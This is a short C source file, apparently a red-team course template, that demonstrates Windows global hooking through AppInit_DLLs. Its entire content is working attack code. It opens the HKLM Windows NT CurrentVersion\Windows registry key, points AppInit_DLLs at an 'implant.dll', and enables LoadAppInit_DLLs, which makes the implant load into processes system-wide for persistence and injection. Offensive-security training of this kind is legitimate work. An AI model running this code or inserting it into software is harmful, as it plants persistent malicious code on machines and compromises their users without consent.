/*

 Red Team Operator course code template
 Global hooks: AppInit_DLLs 
 
 author: reenz0h (twitter: @SEKTOR7net)

*/
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "Advapi32.lib")


int main(void) {
    
	HKEY hKey;
	char * AppInit_data = "c:\\rto\\implant.dll";
	DWORD LoadInit_data = 0x1;
	DWORD bytesOut = 0;

	LSTATUS stat = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", 0, KEY_READ | KEY_SET_VALUE, &hKey);
	if (stat == ERROR_SUCCESS)
		printf("[+] RegOpenKeyExA successfull!\n");
	else {
		printf("[!] Error accessing registry. Are you running as admin? (%d)!\n", stat);
		return -1;
	}

	//setting up AppInit_DLLs
	stat = RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (BYTE *) AppInit_data, strlen(AppInit_data));
	if (stat == ERROR_SUCCESS)
		printf("[+] AppInit_DLLs set!\n");
	else {
		printf("[!] Error accessing registry. Are you running as admin? (%d)!\n", stat);
		RegCloseKey(hKey);
		return -1;
	}
	
	//setting up LoadAppInit_DLLs
	stat = RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (BYTE *) &LoadInit_data, sizeof(LoadInit_data));
	if (stat == ERROR_SUCCESS)
		printf("[+] LoadAppInit_DLLs set!\n");
	else {
		printf("[!] Error accessing registry. Are you running as admin? (%d)!\n", stat);
		RegCloseKey(hKey);
		return -1;
	}

	RegCloseKey(hKey);
	return 0;
}
